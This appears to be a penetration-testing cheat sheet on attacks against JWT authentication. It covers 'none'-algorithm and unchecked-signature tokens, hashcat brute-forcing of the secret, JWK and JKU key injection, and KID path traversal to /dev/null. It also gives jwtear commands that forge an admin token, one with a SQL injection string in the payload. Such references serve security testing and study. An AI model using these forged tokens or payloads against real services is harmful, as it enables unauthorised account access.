# Authentication

## Implementation errors

## OAuth token

## JWT

### Common attacks

#### Accepting token with arbitrary signature

In some cases the validation of the signature might be skipped entirely. In this case is enough to self-sign the token with a key matching the algorithm specified in the header to make the JWT valid

#### Accepting token with no signature

Setting the `alg` parameter in the header to 'none' means that the server should not check the signature of the token. By default tokens with this configuration are refused but since the validation of the parameter is performed by parsing the string it is possible to bypass the checks with obfuscation techniques

#### Bruteforce the secret key

The secret key used to sign the token can be bruteforced locally using HashCat

```
hashcat -a 0 -m 16500 <jwt> <wordlist>
```

### Parameter injection

#### JWK Parameter

this parameter allows to embed the signature key directly inside the token.

```
#Generate public key with openssl
openssl genrsa -out ./private.key 4096
openssl rsa -in private.key -pubout -outform PEM -out public.key

#Generate public key with ssh-keygen
ssh-keygen -t rsa -b 4096 -m PEM -f private.key
ssh-keygen -f private.key -e -m PKCS8 > public.key

#encode the public key in base64
base64 public.key > public_base64.key
```

JWK embedded key format

```
{
    "kid": "<string>",    #must match the one of the added key
    "typ": "JWT",
    "alg": "RS256",
    "jwk": {              #jwk structure begin here
        "kty": "RSA",
        "e": "AQAB",
        "kid": "<string>",    #arbitrary identifier for the key
        "n": "<base64 encoded public key>"
    }
}
```

#### JKU Parameter

the JKU parameter contains an url to JWK keyset to be included in the token for the signature. This parameter can be exploited to make the token include attacker controlled signatures and keys.

```
{
    "kid": "<string>",
    "typ": "JWT",
    "alg": "RS256",
    "jku":"<url to an exposed key set>"
}
```

Key set structure exposed on the web on standard endpoints such as `/.well-known/jwks.json`

```
{
    "keys": [
        {
            "kty": "RSA",
            "e": "AQAB",
            "kid": "<str>",
            "n": "<public key>"
        },
        {
            "kty": "RSA",
            "e": "AQAB",
            "kid": "<str>",
            "n": "<public key>"
        }
    ]
}
```

#### KID Header Path Traversal

The KID parameter is used to determine which key should be used to validate the token's signature. Since there is no defined structure, the kid can be an arbitrary string or even the name of a file and its validation depends entirely on the implementation of the server side service.

```
{
    "kid": "../../path/to/file",
    "typ": "JWT",
    "alg": "HS256",
    "k": "<str>"
}
```

Making the kid parameter point to a an empty file (such as `/dev/null` on linux systems) will result in the kid value being null and signing the token with a base64 encoded null byte will result in a valid signature.

### Jwtear

Tool that allows to create and manipulate JWT tokens. Can be downloaded [here](https://github.com/KINGSABRI/jwtear)

#### Create a signed token

```
jwtear --generate-token --header --header '{"typ":"JWT", "alg":"HS256"}' --payload '{"login":"admin"}' --key '<key>'
```

#### Create a token without signature

```
jwtear --generate-token --header --header '{"typ":"JWT", "alg":"none"}' --payload '{"login":"admin"}'
```

#### Test for injection in parameters

```
jwtear --generate-token --header '{"typ":"JWT", "alg":"none"}' --payload $'{"login":"admin \' or \'a\'=\'a\'}'
```
